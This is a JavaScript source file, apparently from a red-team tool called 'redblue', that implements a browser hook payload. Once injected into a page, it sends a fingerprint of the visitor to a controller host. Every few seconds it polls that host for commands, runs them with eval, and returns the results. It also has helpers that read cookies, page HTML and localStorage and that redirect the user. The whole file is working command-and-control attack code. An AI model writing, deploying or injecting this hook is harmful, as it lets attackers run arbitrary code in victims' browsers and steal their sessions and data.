// redblue Browser Hook
// Minimal payload for browser control
(function(){
    var sid = localStorage.getItem('rb_sid') || (function(){
        var id = 'rb_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('rb_sid', id);
        return id;
    })();

    var base = (document.currentScript && document.currentScript.src)
        ? document.currentScript.src.replace(/\/hook\.js.*/, '')
        : location.protocol + '//' + location.host;

    window._rb = {
        sid: sid,
        exec: function(code) { return eval(code); },
        cookie: function() { return document.cookie; },
        html: function() { return document.documentElement.outerHTML; },
        storage: function() { return JSON.stringify(localStorage); },
        alert: function(msg) { alert(msg); },
        redirect: function(url) { location.href = url; }
    };

    function init() {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', base + '/init', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            sid: sid,
            url: location.href,
            ua: navigator.userAgent,
            platform: navigator.platform,
            screen: screen.width + 'x' + screen.height,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
        }));
    }

    function poll() {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', base + '/poll?id=' + encodeURIComponent(sid), true);
        xhr.onload = function() {
            if (xhr.status === 200 && xhr.responseText) {
                try {
                    var cmds = JSON.parse(xhr.responseText);
                    if (Array.isArray(cmds)) {
                        cmds.forEach(function(cmd) {
                            try {
                                var result = eval(cmd.code);
                                report(cmd.id, true, result);
                            } catch(e) {
                                report(cmd.id, false, e.toString());
                            }
                        });
                    }
                } catch(e) {}
            }
        };
        xhr.send();
    }

    function report(cmdId, success, result) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', base + '/response', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            sid: sid,
            cmd_id: cmdId,
            success: success,
            result: String(result).substr(0, 10000)
        }));
    }

    init();
    setInterval(poll, 3000 + Math.random() * 1000);
})();
